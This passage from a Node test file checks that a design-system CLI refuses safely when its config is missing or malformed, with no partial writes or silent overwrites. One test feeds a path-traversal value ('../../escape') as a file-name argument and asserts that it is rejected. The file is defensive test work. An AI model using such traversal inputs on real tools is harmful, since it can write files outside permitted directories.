  await rm(dir, { recursive: true });
});

test('S38 upgrade refuses before writing anything when the project has no harness.config.json (baseline F7)', async () => {
  const { mkdtemp } = await import('node:fs/promises');
  const { tmpdir } = await import('node:os');
  const { upgrade } = await import('../commands/upgrade.mjs');
  const dir = await mkdtemp(join(tmpdir(), 'sketchbook-upgrade-'));
  await mkdir(join(dir, 'harness'), { recursive: true });
  await cp(join(ROOT, 'harness/manifest.json'), join(dir, 'harness/manifest.json'));
  assert.throws(() => upgrade(dir, ROOT), /harness\.config\.json/);
  assert.deepEqual(await readdir(dir), ['harness']);
  assert.deepEqual(await readdir(join(dir, 'harness')), ['manifest.json']);
  await rm(dir, { recursive: true });
});

test('S39 a malformed config file stops the command before it writes: no half-applied starter, no silent brand overwrite, no traversal through tokens import --name', async () => {
  const dir = await fixture();
  const components = await readdir(join(dir, 'src/components'));
  const config = join(dir, 'harness.config.json');
  const good = await readFile(config, 'utf8');
  await writeFile(config, good.replace(/}\s*$/, ',}'));
  const start = cliJson(dir, 'init', '--start', 'blank', '--yes', '--json');
  assert.equal(start.code, 1);
  assert.match(must(start.json.errors[0], 'the refusal').msg, /harness\.config\.json is not valid JSON/);
  assert.deepEqual(await readdir(join(dir, 'src/components')), components, 'no component removed');
  await writeFile(config, good);

  assert.equal(cli(dir, 'brand', 'add', 'base', '--from', 'current').code, 0);
  const brand = join(dir, 'brand.config.json');
  await writeFile(brand, (await readFile(brand, 'utf8')).replace(/}\s*$/, ',}'));
  const broken = await readFile(brand);
  const use = cliJson(dir, 'brand', 'use', 'base', '--json');
  assert.equal(use.code, 1);
  assert.match(must(use.json.errors[0], 'the refusal').msg, /not valid JSON/);
  assert.ok((await readFile(brand)).equals(broken), 'brand.config.json untouched without --yes');
  assert.equal(cli(dir, 'brand', 'use', 'base', '--yes').code, 0, '--yes replaces the broken file');

  const escape = cliJson(dir, 'tokens', 'import', join(ROOT, 'harness/test/fixtures/import/shadcn-theme.css'), '--from', 'css', '--name', '../../escape', '--json');
  assert.equal(escape.code, 1);
  assert.match(must(escape.json.errors[0], 'the refusal').msg, /plain file name/);
  assert.equal(await exists(join(dir, 'escape.proposal.json')), false);
  await rm(dir, { recursive: true });
});
